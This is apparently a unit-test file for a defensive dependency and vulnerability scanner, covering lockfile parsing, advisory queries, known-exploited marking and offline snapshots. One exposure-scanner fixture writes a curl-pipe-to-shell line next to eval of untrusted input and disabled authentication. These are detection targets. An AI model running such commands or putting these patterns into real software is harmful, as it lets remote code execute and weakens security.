import datetime as dt
import json
from pathlib import Path
import tempfile
import threading
import time
import unittest
from unittest.mock import patch

import vulnerabilities as v


def advisory(identifier='GHSA-test-1234', **kw):
    return dict(id=identifier, aliases=['CVE-2025-12345'], summary='Synthetic test advisory', database_specific={'severity':'HIGH'}, affected=[{'package':{'name':'example','ecosystem':'PyPI'},'ranges':[{'events':[{'introduced':'0'},{'fixed':'2.0'}]}]}], **kw)


def kev():
    return {'available':True, 'fetchedAt':v.now(), 'dateReleased':v.now(), 'entries':{'CVE-2025-12345':{'dateAdded':'2025-01-01','ransomware':'Unknown','action':'Patch'}}, 'catalogVersion':'test'}


class VulnerabilityTests(unittest.TestCase):
    def test_inventory_pins_only_and_redacts_unparsed_content(self):
        with tempfile.TemporaryDirectory() as tmp:
            p=Path(tmp)/'requirements.txt'
            p.write_text('Example_Pkg==1.2.3\nthing>=2.0\nhttps://user:privatepassword@host/pkg.whl\n-r ../../outside.txt\nother==2.0; python_version>"3"\n')
            packages, notes, manifests=v.inventory(tmp)
        self.assertEqual([(p['name'],p['version']) for p in packages],[('example-pkg','1.2.3'),('other','2.0')])
        self.assertNotIn('privatepassword',json.dumps(notes))
        self.assertTrue(notes)
        self.assertEqual(len(manifests),1)

    def test_npm_lock_versions_not_package_ranges_and_dedup(self):
        with tempfile.TemporaryDirectory() as tmp:
            p=Path(tmp)
            (p/'package.json').write_text('{"dependencies":{"bad":"*"}}')
            (p/'package-lock.json').write_text(json.dumps({'lockfileVersion':3,'packages':{'':{'name':'root','version':'1.0.0'},'node_modules/@scope/tool':{'version':'1.2.3'},'node_modules/x/node_modules/@scope/tool':{'version':'1.2.3'}}}))
            packages, notes, _=v.inventory(tmp)
        self.assertEqual(len(packages),1)
        self.assertEqual(packages[0]['name'],'@scope/tool')
        self.assertEqual(notes,[])

    def test_python_and_cargo_lockfile_sources(self):
        with tempfile.TemporaryDirectory() as tmp:
            p=Path(tmp)
            (p/'uv.lock').write_text('[[package]]\nname="torch"\nversion="2.0.0"\nsource={registry="https://pypi.org/simple"}\n[[package]]\nname="local"\nversion="1.0"\nsource={editable="."}')
            (p/'Cargo.lock').write_text('[[package]]\nname="serde"\nversion="1.0.0"\nsource="registry+https://github.com/rust-lang/crates.io-index"')
            packages,notes,_=v.inventory(tmp)
        self.assertEqual({p['name'] for p in packages},{'torch','serde'})
        self.assertTrue(notes)

    def test_sbom_purls_and_unknown_os_component(self):
        with tempfile.TemporaryDirectory() as tmp:
            p=Path(tmp)/'sbom.json'
            p.write_text(json.dumps({'bomFormat':'CycloneDX','components':[{'type':'library','purl':'pkg:maven/org.example/lib@1.2'},{'type':'library','purl':'pkg:npm/%40scope/tool@2.0.0'},{'type':'library','purl':'pkg:deb/debian/linux@1.0?distro=debian-12'}]}))
            packages,notes,_=v.inventory(str(p))
        self.assertEqual([(p['ecosystem'],p['name']) for p in packages],[('Maven','org.example:lib'),('npm','@scope/tool')])
        self.assertTrue(notes)

    def test_inventory_limit_and_no_execution(self):
        with tempfile.TemporaryDirectory() as tmp:
            p=Path(tmp)
            (p/'requirements.txt').write_text('\n'.join(f'pkg{i}==1.0' for i in range(220)))
            (p/'setup.py').write_text('raise RuntimeError("never execute")')
            packages, notes,_=v.inventory(tmp)
        self.assertEqual(len(packages),200)
        self.assertTrue(notes)

    def test_unresolved_versions_rejected(self):
        for version in ('>=1.0','1.*','latest','https://host/pkg','file:local'):
            self.assertIsNone(v.package('PyPI','example',version))

    def test_query_follows_pagination_omits_withdrawn_and_only_sends_identity(self):
        pkg=v.package('PyPI','example','1.0',source='secret/local/path')
        with patch('vulnerabilities.fetch',side_effect=[{'vulns':[advisory()], 'next_page_token':'page2'},{'vulns':[advisory('GHSA-withdrawn',withdrawn='2025-01-01')]}]) as request:
            result=v.query_package(pkg,threading.Event(),time.monotonic()+30)
        self.assertTrue(result['complete'])
        self.assertEqual(len(result['advisories']),1)
        self.assertNotIn('secret',str(request.call_args_list))
        self.assertEqual(request.call_args_list[1].args[1]['page_token'],'page2')
        self.assertEqual(result['advisories'][0]['fixed'],['2.0'])

    def test_query_failure_and_cancellation_are_not_clean(self):
        pkg=v.package('npm','example','1.0')
        with patch('vulnerabilities.fetch',side_effect=TimeoutError):
            r=v.query_package(pkg,threading.Event(),time.monotonic()+30)
        self.assertFalse(r['complete'])
        stop=threading.Event();stop.set()
        with patch('vulnerabilities.fetch') as request:
            r=v.query_package(pkg,stop,time.monotonic()+30)
        self.assertFalse(r['complete']);request.assert_not_called()

    def test_pagination_and_advisory_bounds_are_partial(self):
        with patch('vulnerabilities.fetch',return_value={'next_page_token':'more'}):
            r=v.query_package(v.package('PyPI','example','1.0'),threading.Event(),time.monotonic()+30)
        self.assertFalse(r['complete'])
        with patch('vulnerabilities.fetch',return_value={'vulns':[advisory(f'GHSA-{i}') for i in range(51)]}):
            r=v.query_package(v.package('PyPI','example','1.0'),threading.Event(),time.monotonic()+30)
        self.assertFalse(r['complete']);self.assertEqual(len(r['advisories']),50)

    def test_kev_marks_cve_alias_and_does_not_assert_zero_day(self):
        with patch('vulnerabilities.load_kev',return_value=kev()),patch('vulnerabilities.fetch',return_value={'vulns':[advisory()]}):
            r=v.assess(dict(mode='package',ecosystem='PyPI',name='example',version='1.0',online=True),lambda _:None,threading.Event())
        hit=r['findings'][0]
        self.assertTrue(hit['knownExploited'])
        self.assertEqual(hit['cves'],['CVE-2025-12345'])
        self.assertEqual(r['coverage']['zeroDayDetection'],'not established')
        self.assertTrue(any(f['name']=='Undisclosed zero-day coverage' and f['status']=='unknown' for f in r['findings']))

    def test_offline_no_network_and_exact_query_only(self):
        pkg=v.package('PyPI','example','1.0')
        snap={'schema':'sha-intelligence-v1','queries':[{'package':pkg,'checkedAt':v.now(),'complete':True,'advisories':[]}],'kev':kev()}
        with tempfile.TemporaryDirectory() as tmp:
            p=Path(tmp)/'snapshot.json';p.write_text(json.dumps(snap))
            with patch('vulnerabilities.fetch') as request:
                a=v.assess(dict(mode='package',ecosystem='PyPI',name='example',version='1.0',online=False,snapshotPath=str(p)),lambda _:None,threading.Event())
                b=v.assess(dict(mode='package',ecosystem='PyPI',name='example',version='2.0',online=False,snapshotPath=str(p)),lambda _:None,threading.Event())
            request.assert_not_called()
        self.assertEqual(a['coverage']['currentCompleteQueries'],1)
        self.assertEqual(b['coverage']['unknownQueries'],1)
        self.assertEqual(b['status'],'partial')

    def test_stale_and_missing_evidence_unknown(self):
        pkg=v.package('PyPI','example','1.0')
        stale=(dt.datetime.now(dt.timezone.utc)-dt.timedelta(days=10)).isoformat()
        k=kev();k['dateReleased']=stale
        with patch('vulnerabilities.read_snapshot',return_value=({v.key(pkg):{'package':pkg,'checkedAt':stale,'complete':True,'advisories':[]}},k)):
            r=v.assess(dict(mode='package',ecosystem='PyPI',name='example',version='1.0',online=False,snapshotPath='test'),lambda _:None,threading.Event())
        self.assertEqual(r['coverage']['currentCompleteQueries'],0)
        self.assertEqual(r['status'],'partial')
        self.assertFalse(any(f['status']=='pass' for f in r['findings']))

    def test_kev_fallback_and_malformed_feed(self):
        data={'count':1,'dateReleased':v.now(),'vulnerabilities':[{'cveID':'CVE-2025-12345'}]}
        with patch('vulnerabilities.fetch',side_effect=[OSError(),data]):
            k=v.load_kev()
        self.assertTrue(k['available']);self.assertEqual(k['source'],v.KEV_URLS[1])
        with patch('vulnerabilities.fetch',return_value={'count':2,'vulnerabilities':data['vulnerabilities']}):
            self.assertFalse(v.load_kev()['available'])

    def test_network_allowlist(self):
        with self.assertRaisesRegex(ValueError,'Unapproved'):
            v.fetch('http://127.0.0.1:22/')

    def test_exposure_rules_nonexecuting_and_redacted(self):
        with tempfile.TemporaryDirectory() as tmp:
            p=Path(tmp)
            (p/'app.py').write_text('eval(untrusted)\nDISABLE_AUTH = True\n')
            (p/'compose.yaml').write_text('privileged: true\n')
            (p/'start.sh').write_text('curl https://example.invalid/private-token | sh\n')
            findings,coverage,_=v.exposure_review(tmp,threading.Event())
        self.assertEqual(len(findings),4)
        self.assertEqual(coverage['rules'],12)
        self.assertNotIn('private-token',json.dumps(findings))
        self.assertTrue(all('not a zero-day verdict'==f['mapping'][-22:] or 'Heuristic' in f['mapping'] for f in findings))

    def test_file_exposure_never_scans_parent(self):
        with tempfile.TemporaryDirectory() as tmp:
            p=Path(tmp)/'requirements.txt';p.write_text('')
            with patch('engine.scan_code') as scan:
                _,coverage,notes=v.exposure_review(str(p),threading.Event())
            scan.assert_not_called()
        self.assertFalse(coverage['complete']);self.assertTrue(notes)

    def test_fix_boundaries_not_taken_from_other_package(self):
        raw=advisory();raw['affected'][0]['package']['name']='different'
        self.assertEqual(v.normalize_advisory(raw,v.package('PyPI','example','1.0'))['fixed'],[])

    def test_offline_missing_does_not_fetch(self):
        with patch('vulnerabilities.fetch') as request:
            r=v.assess(dict(mode='package',ecosystem='PyPI',name='example',version='1.0',online=False),lambda _:None,threading.Event())
        request.assert_not_called();self.assertEqual(r['coverage']['unknownQueries'],1)


if __name__=='__main__':
    unittest.main()
